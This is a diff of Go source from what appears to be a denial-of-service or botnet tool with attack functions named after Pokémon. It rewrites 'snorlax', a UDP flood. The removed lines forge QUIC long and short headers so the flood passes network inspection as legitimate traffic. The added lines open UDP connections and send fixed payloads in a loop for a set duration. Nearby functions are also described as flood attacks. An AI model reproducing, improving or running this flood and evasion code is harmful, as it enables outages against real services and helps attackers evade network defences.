@@ -1094,11 +1094,13 @@ func salamence(targetIP string, targetPort, duration int) {
 	wg.Wait()
 }
 
-// snorlax performs a UDP flood disguised as QUIC protocol traffic.
-// Each datagram mimics a QUIC Long Header (Initial/Handshake/0-RTT) or
-// Short Header (1-RTT) so network inspection sees what looks like
-// legitimate QUIC connections rather than a raw UDP flood.
-// Socket is created once per worker and reused for all packets.
+// snorlax performs a UDP flood attack.
+// Opens multiple UDP connections and sends fixed-size payloads.
+// Simpler than raw socket attacks but effective against UDP services.
+// Parameters:
+//   - targetIP: Target IP address or hostname
+//   - targetPort: Target UDP port
+//   - duration: Attack duration in seconds
 func snorlax(targetIP string, targetPort, duration int) {
 	resolvedIP, err := lucario(targetIP)
 	if err != nil {
@@ -1112,17 +1114,11 @@ func snorlax(targetIP string, targetPort, duration int) {
 	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
 	defer cancel()
 	var wg sync.WaitGroup
+	payload := make([]byte, 1024)
 	for i := 0; i < workerPool; i++ {
 		wg.Add(1)
 		guardedGo("snorlax", func() {
 			defer wg.Done()
-			conn, err := net.ListenPacket("udp", ":0")
-			if err != nil {
-				return
-			}
-			defer conn.Close()
-			dst := &net.UDPAddr{IP: dstIP, Port: targetPort}
-			buf := make([]byte, 1200) // QUIC mandated minimum Initial datagram size
 			for {
 				select {
 				case <-ctx.Done():
@@ -1130,76 +1126,17 @@ func snorlax(targetIP string, targetPort, duration int) {
 				case <-stopCh:
 					return
 				default:
-					snorlaxQUIC(buf)
-					conn.WriteTo(buf, dst)
+					conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", dstIP, targetPort))
+					if err != nil {
+						continue
+					}
+					conn.Write(payload)
+					conn.Close()
 				}
 			}
 		})
 	}
 	wg.Wait()
-}
-
-// snorlaxQUIC fills buf to resemble a QUIC datagram (RFC 9000 §17).
-// Long headers include version and connection IDs matching real structure;
-// Short headers mimic post-handshake 1-RTT data. The payload portion is
-// random bytes — indistinguishable from real QUIC encrypted content.
-func snorlaxQUIC(buf []byte) {
-	// Fill entire buffer with random data (simulates encrypted payload).
-	rand.Read(buf)
-
-	if rand.Intn(10) < 7 {
-		// === QUIC Long Header (RFC 9000 §17.2) ===
-		// Byte 0: 1_1_TT_XXXX
-		//   Header Form = 1, Fixed Bit = 1, Type = TT
-		//   Low 4 bits are header-protected (appear random in the wild)
-		pktTypes := []byte{0xC0, 0xD0, 0xE0} // Initial, 0-RTT, Handshake
-		buf[0] = pktTypes[rand.Intn(len(pktTypes))] | byte(rand.Intn(16))
-
-		// Version (bytes 1-4)
-		if rand.Intn(4) == 0 {
-			binary.BigEndian.PutUint32(buf[1:5], 0x6B3343CF) // QUIC v2
-		} else {
-			binary.BigEndian.PutUint32(buf[1:5], 0x00000001) // QUIC v1
-		}
-
-		// DCID Length + DCID (CID bytes already random from rand.Read)
-		dcidLen := 8 + rand.Intn(13) // 8-20 bytes, typical for Initial
-		buf[5] = byte(dcidLen)
-		off := 6 + dcidLen
-		if off >= len(buf)-10 {
-			return
-		}
-
-		// SCID Length + SCID (already random)
-		scidLen := rand.Intn(9) // 0-8 bytes
-		buf[off] = byte(scidLen)
-		off += 1 + scidLen
-		if off >= len(buf)-4 {
-			return
-		}
-
-		// Token Length = 0 (Initial packets from client typically carry no token)
-		if buf[0]&0x30 == 0x00 { // TT=00 → Initial
-			buf[off] = 0x00
-			off++
-		}
-
-		// Payload Length as 2-byte variable-length integer (01xxxxxx xxxxxxxx)
-		rem := len(buf) - off - 2
-		if rem <= 0 {
-			return
-		}
-		buf[off] = 0x40 | byte(rem>>8)
-		buf[off+1] = byte(rem)
-		// Remaining bytes already random = encrypted Packet Number + payload
-	} else {
-		// === QUIC Short Header / 1-RTT (RFC 9000 §17.3) ===
-		// Byte 0: 0_1_SXXKPP
-		//   Header Form = 0, Fixed Bit = 1, rest header-protected
-		buf[0] = 0x40 | byte(rand.Intn(64))
-		// Bytes 1..N = DCID (implicit length) + encrypted PN + encrypted payload
-		// Already random from rand.Read — matches real encrypted 1-RTT packets
-	}
 }
 
 // gengar performs a TCP connection flood attack.
